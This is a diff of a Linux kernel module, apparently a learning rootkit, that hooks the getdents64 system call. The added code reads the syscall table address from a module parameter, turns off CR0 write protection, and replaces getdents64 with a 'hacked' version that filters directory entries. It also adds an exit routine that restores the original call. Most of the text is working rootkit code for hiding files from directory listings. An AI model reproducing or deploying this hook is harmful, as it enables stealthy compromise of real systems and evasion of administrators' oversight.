@@ -23,25 +23,12 @@ static void**sys_call_table;
 
 module_param(sym_addr, ulong, 0644);
 
-static int __init syscall_hooking_init(void)
-{
-	if (sym_addr == 0)
-	{
-		printk(KERN_WARNING "Syscall_hooker: Didn't receive a sys_call_table location!\n");
-		return -1;
-	}
-	sys_call_table = (void **)sym_addr;
-	
-	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
-	
-	return 0;
-}
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 {
-	int fd = (int)regs->di;
+	int fd __attribute__((unused))= (int)regs->di; // Marked as unused, only for learning
 	struct linux_dirent64 *dirp = (struct linux_dirent64*)regs->si;
-	int count = regs->dx;
+	int count __attribute__((unused)) = regs->dx; // Marked as unused, only for learning
 
 	long ret = orig_getdents64(regs);
 	if (ret <= 0)
@@ -79,14 +66,39 @@ static asmlinkage long hacked_getdents64(const struct pt_regs *regs)
 				offset += current_dir->d_reclen;
 			}
 		}
-		copy_to_user(dirp, kdirent, ret);
+		if (copy_to_user(dirp, kdirent, ret) != 0)
+		{
+			kfree(kdirent);
+			return -EFAULT;
+		}
 		kfree(kdirent);
 		return ret;
 	}
 }
 
+static int __init syscall_hooking_init(void)
+{
+	if (sym_addr == 0)
+	{
+		printk(KERN_WARNING "Syscall_hooker: Didn't receive a sys_call_table location!\n");
+		return -1;
+	}
+	sys_call_table = (void **)sym_addr;
+	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
+	write_cr0(read_cr0() & ~(1UL << 16));
+	sys_call_table[__NR_getdents64] = hacked_getdents64;
+	write_cr0(read_cr0() | (1UL << 16));
+	
+	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
+	
+	return 0;
+}
+
 static void __exit syscall_hooking_exit(void)
 {
+	write_cr0(read_cr0() & ~(1UL << 16));
+	sys_call_table[__NR_getdents64] = orig_getdents64;
+	write_cr0(read_cr0() | (1UL << 16));
 	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
 }
 
